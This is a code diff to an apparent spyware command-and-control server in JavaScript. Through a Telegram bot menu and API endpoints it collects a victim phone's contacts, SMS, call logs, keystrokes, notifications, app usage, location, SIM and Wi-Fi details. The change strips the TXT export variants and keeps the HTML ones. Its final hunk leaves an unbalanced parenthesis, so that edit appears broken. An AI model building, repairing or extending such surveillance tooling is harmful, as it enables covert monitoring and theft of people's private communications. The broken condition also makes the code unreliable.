@@ -886,31 +886,24 @@ async function handleCallbackQuery(callbackQuery) {
     } else if (data === 'menu_data') {
         const keyboard = [
             [
-                createInlineButton('📇 Contacts (TXT)', 'cmd:contacts_txt'),
                 createInlineButton('📇 Contacts (HTML)', 'cmd:contacts_html')
             ],
             [
-                createInlineButton('💬 SMS (TXT)', 'cmd:sms_txt'),
                 createInlineButton('💬 SMS (HTML)', 'cmd:sms_html')
             ],
             [
-                createInlineButton('📞 Call Logs (TXT)', 'cmd:calllogs_txt'),
                 createInlineButton('📞 Call Logs (HTML)', 'cmd:calllogs_html')
             ],
             [
-                createInlineButton('⌨️ Keystrokes (TXT)', 'cmd:keystrokes_txt'),
                 createInlineButton('⌨️ Keystrokes (HTML)', 'cmd:keystrokes_html')
             ],
             [
-                createInlineButton('🔔 Notifications (TXT)', 'cmd:notifications_txt'),
                 createInlineButton('🔔 Notifications (HTML)', 'cmd:notifications_html')
             ],
             [
-                createInlineButton('📱 Apps List (TXT)', 'cmd:apps_txt'),
                 createInlineButton('📱 Apps List (HTML)', 'cmd:apps_html')
             ],
             [
-                createInlineButton('📱 App Opens', 'cmd:app_opens'),
                 createInlineButton('📱 App Opens HTML', 'cmd:app_opens_html')
             ],
             [
@@ -1067,7 +1060,6 @@ async function handleCallbackQuery(callbackQuery) {
                 createInlineButton('📞 Call Logs', 'cmd:calllogs')
             ],
             [
-                createInlineButton('📞 Call Logs TXT', 'cmd:calllogs_txt'),
                 createInlineButton('📞 Call Logs HTML', 'cmd:calllogs_html')
             ],
             [
@@ -1646,27 +1638,21 @@ app.post('/api/upload-file', upload.single('file'), async (req, res) => {
         let caption = `📱 *${deviceName}*\n\n`;
         
         switch (command) {
-            case 'contacts_txt':
             case 'contacts_html':
                 caption += `📇 Contacts Export (${itemCount} contacts)`;
                 break;
-            case 'sms_txt':
             case 'sms_html':
                 caption += `💬 SMS Messages Export (${itemCount} messages)`;
                 break;
-            case 'calllogs_txt':
             case 'calllogs_html':
                 caption += `📞 Call Logs Export (${itemCount} calls)`;
                 break;
-            case 'apps_txt':
             case 'apps_html':
                 caption += `📱 Installed Apps Export (${itemCount} apps)`;
                 break;
-            case 'keystrokes_txt':
             case 'keystrokes_html':
                 caption += `⌨️ Keystroke Logs Export (${itemCount} entries)`;
                 break;
-            case 'notifications_txt':
             case 'notifications_html':
                 caption += `🔔 Notifications Export (${itemCount} notifications)`;
                 break;
@@ -2031,7 +2017,7 @@ app.post('/api/result/:deviceId', async (req, res) => {
     const deviceId = req.params.deviceId;
     const { command, result, error } = req.body;
     
-    if (command && (command.includes('_txt') || command.includes('_html') || 
+    if (command && command.includes('_html') || 
         command === 'ip_info' || command === 'phone_number' || command === 'location' ||
         command === 'sim_info' || command === 'wifi_info' || command === 'all_info' ||
         command === 'mobile_info')) {
